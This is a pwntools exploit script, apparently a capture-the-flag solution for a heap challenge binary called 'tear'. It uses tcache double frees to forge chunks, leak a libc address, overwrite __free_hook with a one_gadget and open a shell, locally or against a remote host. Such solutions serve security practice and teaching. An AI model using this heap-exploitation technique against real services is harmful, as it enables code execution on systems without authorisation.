from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x00400bc7
b *0x400b14
b *0x400c54
continue
'''.format(**locals())

exe = './tear_patched'

libc = ELF('./libc.so.6')

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

def nameBuf(s):
    # s = bytes
    sla(b'Name:', s)

def malloc(size, data):
    sla(b'Your choice :', b'1')
    sla(b'Size:', str(size).encode())
    sla(b'Data:', data)

def free():
    sla(b'Your choice :', b'2')

def info():
    sla(b'Your choice :', b'3')
    leak = conn.recvline()
    return leak[6:]

conn = start()

nameBuf(p64(0x602450))
add = 0x602550
malloc(0x90, p64(add))
free()
free()
malloc(0x90, p64(add))
malloc(0x90, b'A' * 4) #original
malloc(0x90, p64(0) + p64(0x41) + b'A' * 0x30 + p64(0) + p64(0x21))

malloc(0xf0, b'A' * 4)
free()
free()
malloc(0xf0, p64(0x602050))
malloc(0xf0, b'A' * 4)
malloc(0xf0, p64(0) + p64(0x501) + b'B'* 0x28 + p64(0x602060))
free()

leak = info()
print(leak)
libc = u64(leak[0:8].ljust(8, b'\x00'))
print(hex(libc))

offset_leak = 0x3ebca0
libc = libc - offset_leak
print(hex(libc))

free_hook = libc + 0x0000000003ed8e8
one_gadget = libc + 0x4f322

malloc(0x60, b'A' * 4)
free()
free()
malloc(0x60, p64(free_hook))
malloc(0x60, p64(free_hook))
malloc(0x60, p64(one_gadget))

free()

conn.interactive()
